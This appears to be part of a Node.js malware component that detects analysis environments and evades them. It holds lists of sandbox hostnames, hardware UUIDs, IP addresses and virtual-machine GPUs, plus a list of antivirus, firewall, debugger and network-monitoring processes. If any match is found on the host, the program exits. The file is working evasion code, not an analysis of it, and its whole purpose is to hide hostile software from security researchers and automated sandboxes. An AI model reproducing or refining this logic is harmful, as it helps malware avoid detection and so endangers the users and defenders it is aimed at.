;
const si = require('systeminformation');
const os = require('os');

const TARGET_GPUS = [
  "Microsoft Remote Display Adapter", 
  "Microsoft Hyper-V Video", 
  "Microsoft Basic Display Adapter", 
  "VMware SVGA 3D", 
  "Standard VGA Graphics Adapter", 
  "NVIDIA GeForce 840M", 
  "NVIDIA GeForce 9400M", 
  "UKBEHH_S", 
  "ASPEED Graphics Family(WDDM)", 
  "H_EDEUEK", 
  "VirtualBox Graphics Adapter", 
  "K9SC88UK", 
  "Стандартный VGA графический адаптер"
];

const TARGET_OS = [
  "Windows Server 2022 Datacenter",
  "Windows Server 2019 Standard",
  "Windows Server 2019 Datacenter",
  "Windows Server 2016 Standard",
  "Windows Server 2016 Datacenter"
];
const BLOCKED_PROGRAMS = [
        "cfp",
        "ccSvcHst",
        "mcshield",
        "vsmon",
        "avgfwsvc",
        "ashDisp",
        "avp",
        "MPFTray",
        "Outpost",
        "tinywall",
        "glasswire",
        "peerblock",
        "smc",
        "bdagent",
        "oaui",
        "pctfw",
        "pfw",
        "SPFConsole",
        "afwServ",
        "egui",
        "ndf",
        "avwsc",
        "fkp",
        "fsaua",
        "avktray",
        "rfwmain",
        "zlclient",
        "uiWinMgr",
        "WRSA",
        "mcuimgr",
        "avgnt",
        "sfmon",
        "zatray",
        "BavPro_Setup",
        "apwiz",
        "pfw7",
        "jpfsrv",
        "pztray",
        "isafe",
        "BullGuard",
        "PSUAMain",
        "SBAMSvc",
        "nlclientapp",
        "woservice",
        "op_mon",
        "WSClientservice",
        "wfc",
        "kicon",
        "avgtray",
        "npfmsg",
        "jpf",
        "WRSSSDK",
        "httpdebuggerui",
        "wireshark",
        "fiddler",
        "regedit",
        "vboxservice",
        "df5serv",
        "vboxtray",
        "vmtoolsd",
        "vmwaretray",
        "ida64",
        "ollydbg",
        "pestudio",
        "vmwareuser",
        "vgauthservice",
        "vmacthlp",
        "x96dbg",
        "vmsrvc",
        "x32dbg",
        "vmusrvc",
        "prl_cc",
        "prl_tools",
        "xenservice",
        "qemu-ga",
        "joeboxcontrol",
        "ksdumperclient",
        "ksdumper",
        "joeboxserver"
];
const TARGET_KEYS = [
            "7AB5C494-39F5-4941-9163-47F54D6D5016",
            "032E02B4-0499-05C3-0806-3C0700080009",
            "03DE0294-0480-05DE-1A06-350700080009",
            "11111111-2222-3333-4444-555555555555",
            "6F3CA5EC-BEC9-4A4D-8274-11168F640058",
            "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548",
            "4C4C4544-0050-3710-8058-CAC04F59344A",
            "00000000-0000-0000-0000-AC1F6BD04972",
            "79AF5279-16CF-4094-9758-F88A616D81B4",
            "5BD24D56-789F-8468-7CDC-CAA7222CC121",
            "49434D53-0200-9065-2500-65902500E439",
            "49434D53-0200-9036-2500-36902500F022",
            "777D84B3-88D1-451C-93E4-D235177420A7",
            "49434D53-0200-9036-2500-369025000C65",
            "B1112042-52E8-E25B-3655-6A4F54155DBF",
            "00000000-0000-0000-0000-AC1F6BD048FE",
            "EB16924B-FB6D-4FA1-8666-17B91F62FB37",
            "A15A930C-8251-9645-AF63-E45AD728C20C",
            "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3",
            "C7D23342-A5D4-68A1-59AC-CF40F735B363",
            "63203342-0EB0-AA1A-4DF5-3FB37DBB0670",
            "44B94D56-65AB-DC02-86A0-98143A7423BF",
            "6608003F-ECE4-494E-B07E-1C4615D1D93C",
            "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A",
            "49434D53-0200-9036-2500-369025003AF0",
            "8B4E8278-525C-7343-B825-280AEBCD3BCB",
            "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27",
            "BB64E044-87BA-C847-BC0A-C797D1A16A50",
            "2E6FB594-9D55-4424-8E74-CE25A25E36B0",
            "42A82042-3F13-512F-5E3D-6BF4FFFD8518"
];
const BLOCKED_HOSTNAMES = [
    "DESKTOP-CDLNVOQ",
    "BEE7370C-8C0C-4",
    "DESKTOP-NAKFFMT",
    "WIN-5E07COS9ALR",
    "B30F0242-1C6A-4",
    "DESKTOP-VRSQLAG",
    "Q9IATRKPRH",
    "XC64ZB",
    "DESKTOP-D019GDM",
    "DESKTOP-WI8CLET",
    "SERVER1",
    "LISA-PC",
    "JOHN-PC",
    "DESKTOP-B0T93D6",
    "DESKTOP-1PYKP29",
    "DESKTOP-1Y2433R",
    "WILEYPC",
    "WORK",
    "6C4E733F-C2D9-4",
    "RALPHS-PC",
    "DESKTOP-WG3MYJS",
    "DESKTOP-7XC6GEZ",
    "DESKTOP-5OV9S0O",
    "QarZhrdBpj",
    "ORELEEPC",
    "ARCHIBALDPC",
    "JULIA-PC",
    "d1bnJkfVlH",
    "DESKTOP-B0T93D6"
];
const BLACKLISTED_IPS = [
            "88.132.231.71",
            "78.139.8.50",
            "20.99.160.173",
            "88.153.199.169",
            "84.147.62.12",
            "194.154.78.160",
            "92.211.109.160",
            "195.74.76.222",
            "188.105.91.116",
            "34.105.183.68",
            "92.211.55.199",
            "79.104.209.33",
            "95.25.204.90",
            "34.145.89.174",
            "109.74.154.90",
            "109.145.173.169",
            "34.141.146.114",
            "212.119.227.151",
            "195.239.51.59",
            "192.40.57.234",
            "64.124.12.162",
            "34.142.74.220",
            "188.105.91.173",
            "109.74.154.91",
            "34.105.72.241",
            "109.74.154.92",
            "213.33.142.50",
            "109.74.154.91",
            "93.216.75.209",
            "192.87.28.103",
            "88.132.226.203",
            "195.181.175.105",
            "88.132.225.100",
            "92.211.192.144",
            "34.83.46.130",
            "188.105.91.143",
            "34.85.243.241",
            "34.141.245.25",
            "178.239.165.70",
            "84.147.54.113",
            "193.128.114.45",
            "95.25.81.24",
            "92.211.52.62",
            "88.132.227.238",
            "35.199.6.13",
            "80.211.0.97",
            "34.85.253.170",
            "23.128.248.46",
            "35.229.69.227",
            "34.138.96.23",
            "192.211.110.74",
            "35.237.47.12",
            "87.166.50.213",
            "34.253.248.228",
            "212.119.227.167",
            "193.225.193.201",
            "34.145.195.58",
            "34.105.0.27",
            "195.239.51.3",
            "35.192.93.107"
];
function normalizeString(s = '') {
  return String(s || '').normalize ? s.normalize('NFKD') : String(s || '');
}
function normalizeHost(s = "") {
  return s.trim().toLowerCase();
}
function normGUID(s = '') {
  return normalizeString(s).replace(/[\{\}\s]/g, '').toUpperCase().trim();
}
function looseNorm(s = '') {
  return normalizeString(s).toLowerCase().trim();
}

const TARGET_KEYS_NORM = new Set(TARGET_KEYS.map(k => normGUID(k)));

function runCmd(cmd, timeout = 10000) {
  return new Promise((resolve) => {
    exec(cmd, { windowsHide: true, timeout }, (err, stdout, stderr) => {
      if (err) {
        return resolve({ ok: false, error: err.message, stdout: stdout || '', stderr: stderr || '' });
      }
      const lines = String(stdout || '').split(/\r?\n/).map(l => l.trim()).filter(Boolean);
      resolve({ ok: true, lines, raw: stdout });
    });
  });
}


async function wmicGet(className, property) {
  const cmd = `wmic ${className} get ${property} /format:list`;
  const res = await runCmd(cmd);
  if (!res.ok) return [];
  const values = [];
  for (const l of res.lines) {
    const idx = l.indexOf('=');
    if (idx >= 0) {
      const key = l.slice(0, idx).trim();
      const val = l.slice(idx + 1).trim();
      if (String(key).toLowerCase() === String(property).toLowerCase() && val) values.push(val);
    } else {
      if (l && l.toUpperCase() !== String(property).toUpperCase()) {
        values.push(l);
      }
    }
  }
  return values;
}
function blockAndExit() {
 console.log('uh oh big bad')
  process.exit(8);
}
const https = require('https');
function getPublicIP(timeout = 5000) {
  return new Promise((resolve) => {
    const req = https.get('https://api.ipify.org?format=json', { timeout }, (res) => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => {
        try {
          const j = JSON.parse(data);
          resolve(j.ip || null);
        } catch (e) {
          resolve(null);
        }
      });
    });
    req.on('error', () => resolve(null));
    req.on('timeout', () => { req.destroy(); resolve(null); });
  });
}

function normIP(ip = '') {
  return String(ip || '').replace(/^\[|\]$/g, '').trim();
}

async function checkIPs() {

  try {
    const nets = os.networkInterfaces();
    const localIps = [];
    for (const name of Object.keys(nets)) {
      for (const ni of nets[name] || []) {
        if (!ni || !ni.address) continue;
        localIps.push({ if: name, addr: normIP(ni.address), family: ni.family, internal: !!ni.internal });
      }
    }

    if (localIps.length === 0) {
    } else {
      for (const ipObj of localIps) {
        const a = ipObj.addr;
        if (BLACKLISTED_IPS.some(b => normIP(b) === a)) {
          blockAndExit();
        }
      }
    }
  } catch (err) {
    console.log('  Failed to enumerate local interfaces:', err && err.message ? err.message : err);
  }

  try {
    const publicIp = await getPublicIP();
    if (!publicIp) {
    } else {
      const p = normIP(publicIp);
      if (BLACKLISTED_IPS.some(b => normIP(b) === p)) {
        blockAndExit();
      }
    }
  } catch (err) {
    console.log('  Error checking public IP:', err && err.message ? err.message : err);
  }

}
async function checkRunningProcesses() {
  const res = await runCmd('wmic process get Name /value');
  if (!res.ok) return;

  const blockedNormalized = BLOCKED_PROGRAMS.map(p =>
    p.trim().toLowerCase().endsWith('.exe') ? p.trim().toLowerCase() : (p.trim().toLowerCase() + '.exe')
  );

  for (const line of res.lines) {
    const parts = line.split('=');
    if (parts.length !== 2) continue;

    const processName = parts[1].trim().toLowerCase();
    if (blockedNormalized.includes(processName)) {
      blockAndExit();
    }
  }
}


async function checkHostname() {
  const hostname = os.hostname() || '';

  const normalized = normalizeHost(hostname);
  const bad = BLOCKED_HOSTNAMES.find(h => normalizeHost(h) === normalized);

  if (bad) {
    blockAndExit();
  }

}

async function checkOsAndGpu() {
  const osInfo = await si.osInfo();
  const osString = `${osInfo.distro} ${osInfo.release}`;

  if (TARGET_OS.some(t => looseNorm(osString).includes(looseNorm(t)))) {
    blockAndExit();
  }

  const gfx = await si.graphics();

  if (gfx.controllers) {
    for (const c of gfx.controllers) {
      const gpuString = `${c.vendor} ${c.model}`;
      if (TARGET_GPUS.some(t => looseNorm(gpuString).includes(looseNorm(t)))) {
        blockAndExit();
      }
    }
  }

}

async function checkHardwareIDs() {
  const uuidVals = await wmicGet('csproduct', 'UUID');

  for (const v of uuidVals) {
    const normalized = normGUID(v);
    if (TARGET_KEYS_NORM.has(normalized)) {
      blockAndExit();
    }
  }

}

(async function main() {

  if (process.platform !== 'win32') {
    blockAndExit();
  }

  await checkOsAndGpu();
  await checkHostname();
  await checkHardwareIDs();
  await checkRunningProcesses();
   await checkIPs();

  process.exit(0);
})();
